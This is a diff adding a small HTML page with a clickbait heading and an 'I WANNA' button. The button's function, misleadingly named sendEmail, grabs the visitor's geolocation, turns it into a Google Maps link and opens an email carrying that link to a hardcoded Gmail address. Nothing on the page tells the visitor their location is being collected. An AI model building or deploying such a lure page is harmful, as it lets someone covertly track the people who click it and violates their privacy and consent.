@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>MORE INFOS</title>
+</head>
+<body>
+    <h1>CLICK HERE TO SEE MORE</h1>
+  <button onclick="sendEmail()">I WANNA</button>
+
+  <script>
+    function sendEmail() {
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+          const recipient = "keodevspace@gmail.com"; // Set your email here
+          const subject = "Current Location";
+          const body = `${mapLink}`;
+
+          const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+          window.location.href = mailtoLink;
+        },
+        () => alert("Could not get your location.")
+      );
+    }
+  </script>
+</body>
+</html>
